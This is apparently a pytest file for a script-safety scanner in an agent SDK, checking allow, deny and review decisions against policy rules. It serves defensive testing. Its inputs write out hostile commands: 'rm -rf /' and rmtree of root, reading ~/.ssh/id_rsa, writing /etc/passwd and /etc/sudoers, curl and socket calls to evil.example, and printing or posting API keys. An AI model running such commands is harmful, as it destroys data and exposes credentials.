# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""Python, Bash, decision, privacy, and performance tests."""

from __future__ import annotations

from pathlib import Path
import time

import pytest
import yaml

from trpc_agent_sdk.tools.safety import RiskLevel
from trpc_agent_sdk.tools.safety import SafetyDecision
from trpc_agent_sdk.tools.safety import SafetyPolicy
from trpc_agent_sdk.tools.safety import SafetyScanRequest
from trpc_agent_sdk.tools.safety import SafetyScanner
from trpc_agent_sdk.tools.safety import ScriptLanguage


def _scan(content: str, language: ScriptLanguage, **kwargs):
    policy = SafetyPolicy.model_validate({
        "network": {
            "allowed_domains": ["api.example.com"],
            "allow_subdomains": False
        },
        "commands": {
            "allowed": ["echo", "ls", "cat", "pwd"]
        },
    })
    return SafetyScanner(policy).scan(
        SafetyScanRequest(
            content=content,
            language=language,
            cwd="/tmp/tool-safety-workspace",
            **kwargs,
        ))


@pytest.mark.parametrize(
    ("content", "language", "decision", "rule_id"),
    [
        ('print("hello")', ScriptLanguage.PYTHON, SafetyDecision.ALLOW, None),
        (
            'import shutil\nshutil.rmtree("/")',
            ScriptLanguage.PYTHON,
            SafetyDecision.DENY,
            "FILE-001",
        ),
        (
            'from pathlib import Path\nPath("~/.ssh/id_rsa").read_text()',
            ScriptLanguage.PYTHON,
            SafetyDecision.DENY,
            "FILE-003",
        ),
        (
            'open("/etc/sudoers", "w").write("bad")',
            ScriptLanguage.PYTHON,
            SafetyDecision.DENY,
            "FILE-004",
        ),
        (
            'open("/etc/passwd", "w").write("bad")',
            ScriptLanguage.PYTHON,
            SafetyDecision.DENY,
            "FILE-004",
        ),
        (
            'import requests\nrequests.get("https://evil.example/data")',
            ScriptLanguage.PYTHON,
            SafetyDecision.DENY,
            "NET-001",
        ),
        (
            'import requests\nrequests.get("https://api.example.com/data")',
            ScriptLanguage.PYTHON,
            SafetyDecision.ALLOW,
            None,
        ),
        (
            'import subprocess\nsubprocess.run(["ls", "-la"], shell=False)',
            ScriptLanguage.PYTHON,
            SafetyDecision.ALLOW,
            None,
        ),
        (
            'import subprocess\nsubprocess.run("echo ok; rm -rf /", shell=True)',
            ScriptLanguage.PYTHON,
            SafetyDecision.DENY,
            "PROC-001",
        ),
        (
            'import subprocess\nsubprocess.run(["pip", "install", "demo"])',
            ScriptLanguage.PYTHON,
            SafetyDecision.NEEDS_HUMAN_REVIEW,
            "DEP-001",
        ),
        ("while True:\n    pass", ScriptLanguage.PYTHON, SafetyDecision.NEEDS_HUMAN_REVIEW, "RES-002"),
        (
            'import os\nprint(os.environ["OPENAI_API_KEY"])',
            ScriptLanguage.PYTHON,
            SafetyDecision.DENY,
            "SECRET-001",
        ),
        ("echo hello | cat", ScriptLanguage.BASH, SafetyDecision.ALLOW, None),
        ("echo ok &", ScriptLanguage.BASH, SafetyDecision.NEEDS_HUMAN_REVIEW, "PROC-004"),
        ("truncate -s 200M output.bin", ScriptLanguage.BASH, SafetyDecision.DENY, "RES-003"),
        ("curl https://evil.example/data", ScriptLanguage.BASH, SafetyDecision.DENY, "NET-001"),
        ("curl https://api.example.com/data", ScriptLanguage.BASH, SafetyDecision.ALLOW, None),
        ("rm -rf ./build", ScriptLanguage.BASH, SafetyDecision.NEEDS_HUMAN_REVIEW, "FILE-002"),
        ("cat ~/.ssh/id_rsa", ScriptLanguage.BASH, SafetyDecision.DENY, "FILE-003"),
        ("tee /etc/passwd", ScriptLanguage.BASH, SafetyDecision.DENY, "FILE-004"),
        (
            'import socket\nsock = socket.socket()\nsock.connect(("evil.example", 443))',
            ScriptLanguage.PYTHON,
            SafetyDecision.DENY,
            "NET-001",
        ),
    ],
)
def test_expected_decisions(content, language, decision, rule_id):
    report = _scan(content, language)

    assert report.decision == decision
    if rule_id:
        assert rule_id in {finding.rule_id for finding in report.findings}


def test_sensitive_env_presence_alone_is_safe():
    report = _scan(
        'print("ready")',
        ScriptLanguage.PYTHON,
        env={"OPENAI_API_KEY": "super-secret-value"},
    )

    assert report.decision == SafetyDecision.ALLOW
    assert "super-secret-value" not in report.model_dump_json()


def test_bash_argv_participates_in_command_scan():
    report = _scan(
        "curl",
        ScriptLanguage.BASH,
        argv=["https://evil.example/data"],
    )

    assert report.decision == SafetyDecision.DENY
    assert "NET-001" in {finding.rule_id for finding in report.findings}


def test_sensitive_python_argv_flow_is_blocked_without_leaking_value():
    secret = "sk-abcdefghijklmnopqrstuv"
    report = _scan(
        "import sys\nprint(sys.argv[1])",
        ScriptLanguage.PYTHON,
        argv=[secret],
    )

    assert report.decision == SafetyDecision.DENY
    assert "SECRET-001" in {finding.rule_id for finding in report.findings}
    assert secret not in report.model_dump_json()


def test_secret_evidence_is_redacted():
    report = _scan(
        'token = "abcdefghijklmnopqrstuvwxyz0123456789"\nprint(token)',
        ScriptLanguage.PYTHON,
    )

    assert report.decision == SafetyDecision.DENY
    serialized = report.model_dump_json()
    assert "abcdefghijklmnopqrstuvwxyz0123456789" not in serialized
    assert report.sanitized is True


def test_secret_in_keyword_argument_is_blocked_and_redacted():
    report = _scan(
        'import os\nimport requests\nrequests.post("https://api.example.com", data=os.environ["API_TOKEN"])',
        ScriptLanguage.PYTHON,
    )

    assert report.decision == SafetyDecision.DENY
    assert "SECRET-001" in {finding.rule_id for finding in report.findings}


def test_literal_api_token_at_output_sink_is_blocked_and_redacted():
    secret = "sk-abcdefghijklmnopqrstuv"
    report = _scan(f'print("{secret}")', ScriptLanguage.PYTHON)

    assert report.decision == SafetyDecision.DENY
    assert secret not in report.model_dump_json()


def test_comments_and_tutorial_strings_do_not_trigger_python_rules():
    report = _scan(
        '# rm -rf /\ntutorial = "pip install package"\nprint(tutorial)',
        ScriptLanguage.PYTHON,
    )

    assert report.decision == SafetyDecision.ALLOW


def test_subdomain_policy_is_exact_by_default():
    report = _scan(
        'import requests\nrequests.get("https://api.example.com.evil.test")',
        ScriptLanguage.PYTHON,
    )

    assert report.decision == SafetyDecision.DENY
    assert report.findings[0].rule_id == "NET-001"


def test_dynamic_network_target_requires_review():
    report = _scan(
        "import requests\nrequests.get(target)",
        ScriptLanguage.PYTHON,
    )

    assert report.decision == SafetyDecision.NEEDS_HUMAN_REVIEW
    assert report.findings[0].rule_id == "NET-002"


def test_command_inside_shell_condition_is_still_scanned():
    report = _scan(
        "if rm -rf /; then echo bad; fi",
        ScriptLanguage.BASH,
    )

    assert report.decision == SafetyDecision.DENY
    assert "FILE-001" in {finding.rule_id for finding in report.findings}


def test_rule_override_changes_action_without_code_change():
    policy = SafetyPolicy.model_validate({"rule_overrides": {
        "DEP-001": {
            "action": "deny",
        }
    }})
    report = SafetyScanner(policy).scan(
        SafetyScanRequest(
            content='import subprocess\nsubprocess.run(["pip", "install", "demo"])',
            language=ScriptLanguage.PYTHON,
        ))

    assert report.decision == SafetyDecision.DENY
    assert report.findings[0].rule_id == "DEP-001"


def test_oversized_input_is_rejected_before_parsing():
    policy = SafetyPolicy.model_validate({"limits": {"max_script_size_bytes": 10}})
    report = SafetyScanner(policy).scan(SafetyScanRequest(content="x = " + "a" * 100, language=ScriptLanguage.PYTHON))

    assert report.decision == SafetyDecision.DENY
    assert report.findings[0].rule_id == "POLICY-002"


def test_no_findings_uses_none_risk_level():
    report = _scan('print("ok")', ScriptLanguage.PYTHON)

    assert report.risk_level == RiskLevel.NONE
    assert report.findings == []


def test_500_line_script_scans_under_one_second():
    content = "\n".join(f"value_{index} = {index}" for index in range(500))
    scanner = SafetyScanner()
    request = SafetyScanRequest(content=content, language=ScriptLanguage.PYTHON)

    started = time.perf_counter()
    report = scanner.scan(request)
    elapsed = time.perf_counter() - started

    assert report.decision == SafetyDecision.ALLOW
    assert elapsed < 1


def test_public_manifest_exact_results_and_acceptance_metrics():
    root = Path(__file__).parents[3]
    example = root / "examples" / "tool_safety_guard"
    manifest = yaml.safe_load((example / "samples" / "manifest.yaml").read_text(encoding="utf-8"))
    scanner = SafetyScanner.from_yaml(example / "tool_safety_policy.yaml")
    safe_total = 0
    safe_false_positives = 0
    risky_total = 0
    risky_detected = 0
    mandatory_totals = {
        "FILE-001": 0,
        "FILE-003": 0,
        "NET-001": 0,
    }
    mandatory_detected = dict.fromkeys(mandatory_totals, 0)
    mandatory_languages = {rule_id: set() for rule_id in mandatory_totals}

    for entry in manifest:
        sample = example / "samples" / entry["file"]
        report = scanner.scan(
            SafetyScanRequest(
                content=sample.read_text(encoding="utf-8"),
                language=ScriptLanguage(entry["language"]),
                cwd="/tmp/tool-safety-workspace",
                tool_name="manifest_test",
            ))
        actual_rules = {finding.rule_id for finding in report.findings}
        assert report.decision.value == entry["expected_decision"], entry["file"]
        assert set(entry["expected_rule_ids"]) <= actual_rules, entry["file"]
        for rule_id in mandatory_totals:
            if rule_id in entry["expected_rule_ids"]:
                mandatory_totals[rule_id] += 1
                mandatory_detected[rule_id] += rule_id in actual_rules
                mandatory_languages[rule_id].add(entry["language"])
        if entry["label"] == "safe":
            safe_total += 1
            safe_false_positives += report.decision != SafetyDecision.ALLOW
        else:
            risky_total += 1
            risky_detected += report.decision != SafetyDecision.ALLOW

    assert len(manifest) >= 12
    assert risky_detected / risky_total >= 0.90
    assert safe_false_positives / safe_total <= 0.10
    for rule_id, total in mandatory_totals.items():
        assert total >= 2, f"{rule_id} must have Python and Bash samples"
        assert {"python", "bash"} <= mandatory_languages[rule_id]
        assert mandatory_detected[rule_id] / total == 1.0
